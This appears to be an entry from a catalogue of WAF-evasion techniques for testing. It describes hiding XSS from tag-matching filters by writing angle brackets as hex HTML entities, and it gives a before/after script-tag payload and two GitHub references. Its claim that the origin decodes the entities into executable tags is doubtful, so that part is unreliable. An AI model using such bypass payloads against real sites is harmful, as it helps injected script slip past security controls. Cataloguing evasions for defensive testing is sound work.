# xss_html_entity

Category: xss | Fidelity: differential

## Mechanism

Replace angle brackets with hex entities (< -> &#x3c;).

## Why the WAF misses it

Tag-pattern rules matching `<...>` miss the `&#x3C;...&#x3E;` spelling.

## Why the origin still accepts it

The HTML parser decodes entities into angle brackets before scripting runs.

## Prerequisites and limits

Reflection into an HTML-parsed context.

## References

- https://github.com/larbi67/WAF-XSS-Bypass
- https://github.com/Ilias1988/waf-bypass

## Before / After

```
<script>alert(1)</script>
-->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```

## Measured result

Not yet measured.
